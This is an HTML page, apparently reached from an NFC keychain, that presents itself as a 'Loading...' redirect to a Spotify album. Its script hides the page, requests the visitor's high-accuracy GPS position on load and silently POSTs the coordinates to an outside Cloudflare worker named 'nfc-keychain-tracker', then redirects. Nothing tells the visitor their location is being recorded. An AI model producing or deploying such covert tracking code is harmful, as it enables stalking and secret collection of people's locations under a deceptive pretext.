<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>

<style>
/* ==========================================
   FULL HIDE (NO VISUAL OUTPUT)
   ========================================== */

html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  background: white;

  opacity: 0;
  visibility: hidden;
  pointer-events: none;
}
</style>

<script>

// ==========================================
// CONFIGURATION
// ==========================================

const WORKER_URL =
  "https://nfc-keychain-tracker.meyarirangkeychain.workers.dev/";

const SPOTIFY_ALBUM_URL =
  "https://open.spotify.com/album/3ukkRHDHbN8tNRPKsGZR1h?si=50596d20d12446e4";

// ==========================================
// SEND DATA
// ==========================================

async function logVisit(data) {

  try {
    await fetch(WORKER_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
  } catch {
    // silent fail
  }
}

// ==========================================
// REDIRECT
// ==========================================

function redirectToSpotify() {
  window.location.replace(SPOTIFY_ALBUM_URL);
}
function gpsSuccess(position) {

  logVisit({
    page: "album",
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy
  });

  setTimeout(redirectToSpotify, 300);
}
function gpsError() {
  logVisit({
    page: "album"
  });
  setTimeout(redirectToSpotify, 300);
}
document.addEventListener("DOMContentLoaded", () => {
  navigator.geolocation.getCurrentPosition(
    gpsSuccess,
    gpsError,
    {
      enableHighAccuracy: true,
      timeout: 5000,
      maximumAge: 0
    }
  );
  setTimeout(redirectToSpotify, 6000);
});
</script>
</head>
<body></body>
</html>
